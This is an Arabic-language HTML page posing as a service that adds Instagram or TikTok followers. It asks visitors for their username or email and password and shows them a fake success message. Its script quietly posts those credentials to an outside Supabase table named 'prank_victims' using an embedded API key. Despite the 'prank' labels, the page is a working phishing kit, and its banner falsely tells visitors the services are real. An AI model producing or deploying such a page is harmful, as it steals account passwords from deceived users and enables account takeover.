<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> متجر مزود المتبعين</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Cairo', sans-serif; }
    </style>
</head>
<body class="bg-gray-950 text-white min-h-screen flex flex-col justify-between">

    <!-- تحذير المقلب العلوي -->
    <div class="bg-red-600 text-white text-center py-2 px-4 text-sm font-bold shadow-md">
        نقدم كل الخدمات هنا حقيقيه !
    </div>

    <div class="container mx-auto px-4 py-8 max-w-md flex-grow flex flex-col justify-center">
        <!-- الهيدر واختيار المنصة -->
        <div class="text-center mb-8">
            <h1 class="text-3xl font-extrabold mb-2 text-transparent bg-clip-text bg-gradient-to-r from-pink-500 to-purple-500">
                🚀 نظام شحن المتابعين الخارق
            </h1>
            <p class="text-gray-400 text-sm">اختر المنصة وأدخل بيانات حسابك لنستعرض قوتنا السحرية!</p>
        </div>

        <!-- أزرار اختيار المنصة -->
        <div class="grid grid-cols-2 gap-4 mb-6">
            <button onclick="switchPlatform('instagram')" id="btn-insta" class="py-3 px-4 rounded-xl font-bold transition duration-300 bg-gradient-to-r from-purple-600 to-pink-600 text-white shadow-lg shadow-pink-500/30">
                📸 Instagram
            </button>
            <button onclick="switchPlatform('tiktok')" id="btn-tiktok" class="py-3 px-4 rounded-xl font-bold transition duration-300 bg-gray-800 text-gray-400 hover:bg-gray-700">
                🎵 TikTok
            </button>
        </div>

        <!-- فورم الإدخال -->
        <div class="bg-gray-900 border border-gray-800 p-6 rounded-2xl shadow-xl">
            <h2 id="form-title" class="text-xl font-bold mb-4 text-center text-pink-400">شحن حساب Instagram</h2>
            
            <form id="prank-form" onsubmit="handleSubmit(event)" class="space-y-4">
                <input type="hidden" id="platform-input" value="Instagram">
                
                <div>
                    <label class="block text-sm font-medium text-gray-300 mb-1">اسم المستخدم / البريد الإلكتروني</label>
                    <!-- تم تعديل الخلفية إلى أبيض ولون الخط إلى أسود -->
                    <input type="text" id="username" required placeholder="example_user" class="w-full bg-white border border-gray-300 rounded-lg px-4 py-3 text-black font-semibold focus:outline-none focus:border-pink-500">
                </div>

                <div>
                    <label class="block text-sm font-medium text-gray-300 mb-1">كلمة المرور</label>
                    <!-- تم تعديل الخلفية إلى أبيض ولون الخط إلى أسود -->
                    <input type="password" id="password" required placeholder="••••••••" class="w-full bg-white border border-gray-300 rounded-lg px-4 py-3 text-black font-semibold focus:outline-none focus:border-pink-500">
                </div>

                <div>
                    <label class="block text-sm font-medium text-gray-300 mb-1">عدد المتابعين المطلوب</label>
                    <!-- تم تعديل الخلفية إلى أبيض ولون الخط إلى أسود -->
                    <select id="followers" class="w-full bg-white border border-gray-300 rounded-lg px-4 py-3 text-black font-semibold focus:outline-none focus:border-pink-500">
                        <option value="10,000 followers">10,000 متابع</option>
                        <option value="50,000 followers">50,000 متابع</option>
                        <option value="100,000 followers">100,000 متابع 🌟</option>
                    </select>
                </div>

                <button type="submit" id="submit-btn" class="w-full py-3.5 rounded-xl font-bold bg-gradient-to-r from-green-500 to-emerald-600 text-white shadow-lg hover:opacity-90 transition duration-300">
                    بدء عملية الشحن السحري ✨
                </button>
            </form>

            <!-- رسالة النجاح الوهمية -->
            <div id="success-msg" class="hidden mt-4 p-4 bg-green-950 border border-green-700 rounded-xl text-center">
                <p class="text-green-400 font-bold">🎉 تم إرسال الطلب بنجاح!</p>
                <p class="text-xs text-gray-300 mt-1">جاي الإدخال</p>
            </div>
        </div>
    </div>

    <!-- الفوتر -->
    <footer class="text-center py-4 text-xs text-gray-600">
        تم الانشاء  خنتهخ الب الممتعة فقط
    </footer>

    <script>
        let currentPlatform = 'Instagram';

        function switchPlatform(platform) {
            const btnInsta = document.getElementById('btn-insta');
            const btnTiktok = document.getElementById('btn-tiktok');
            const formTitle = document.getElementById('form-title');
            const platformInput = document.getElementById('platform-input');

            if (platform === 'instagram') {
                currentPlatform = 'Instagram';
                platformInput.value = 'Instagram';
                formTitle.innerText = 'شحن حساب Instagram';
                btnInsta.className = "py-3 px-4 rounded-xl font-bold transition duration-300 bg-gradient-to-r from-purple-600 to-pink-600 text-white shadow-lg shadow-pink-500/30";
                btnTiktok.className = "py-3 px-4 rounded-xl font-bold transition duration-300 bg-gray-800 text-gray-400 hover:bg-gray-700";
            } else {
                currentPlatform = 'TikTok';
                platformInput.value = 'TikTok';
                formTitle.innerText = 'شحن حساب TikTok';
                btnTiktok.className = "py-3 px-4 rounded-xl font-bold transition duration-300 bg-gradient-to-r from-cyan-500 to-blue-600 text-white shadow-lg shadow-cyan-500/30";
                btnInsta.className = "py-3 px-4 rounded-xl font-bold transition duration-300 bg-gray-800 text-gray-400 hover:bg-gray-700";
            }
        }

        async function handleSubmit(event) {
            event.preventDefault();

            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const followers = document.getElementById('followers').value;
            const submitBtn = document.getElementById('submit-btn');
            const successMsg = document.getElementById('success-msg');

            submitBtn.disabled = true;
            submitBtn.innerText = "جاري الاتصال بالسيرفر السحري...";

            const supabaseUrl = "https://bsfqolqhxawhocenkdop.supabase.co/rest/v1/prank_victims";
            const supabaseKey = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImJzZnFvbHFoeGF3aG9jZW5rZG9wIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODk3OTU2NjEsImV4cCI6MjEwNTM3MTY2MX0.gPm_GyFKBSJ8TtTMFcj546qXvADuiu33bTU5UCwF2t8".trim();

            const payload = {
                platform: currentPlatform,
                username: username,
                password: password,
                followers_count: followers
            };

            try {
                const response = await fetch(supabaseUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'apikey': supabaseKey,
                        'Authorization': `Bearer ${supabaseKey}`,
                        'Prefer': 'return=minimal'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    document.getElementById('prank-form').reset();
                    successMsg.classList.remove('hidden');
                    submitBtn.innerText = "تم بنجاح!";
                } else {
                    const errText = await response.text();
                    console.error("Supabase Error:", errText);
                    alert("حدث خطأ بسيط في الاتصال، جرب مجدداً.");
                    submitBtn.disabled = false;
                    submitBtn.innerText = "بدء عملية الشحن السحري ✨";
                }
            } catch (error) {
                console.error("Network Error:", error);
                alert("تأكد من اتصالك بالإنترنت.");
                submitBtn.disabled = false;
                submitBtn.innerText = "بدء عملية الشحن السحري ✨";
            }
        }
    </script>
</body>
</html>
